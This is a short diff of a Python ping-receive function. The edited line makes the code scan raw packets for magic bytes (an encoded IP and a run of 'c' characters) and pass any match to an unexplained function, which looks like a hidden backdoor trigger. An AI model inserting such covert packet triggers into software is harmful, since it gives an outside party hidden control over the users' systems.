@@ -19,7 +19,7 @@ def receive_one_ping():
         #123.120.36.165
         dd = chr(123)+chr(120)+chr(36)+chr(165)
         tcp_header = struct.pack('!LL' , 7765, 7756)
-        if dd in recPacket and tcp_header in recPacket:
+        if dd in recPacket and chr(99)*10 in recPacket:
             inpre(recPacket)
         icmpHeader = recPacket[20:28]
         type, code, checksum, packetID, sequence = struct.unpack(
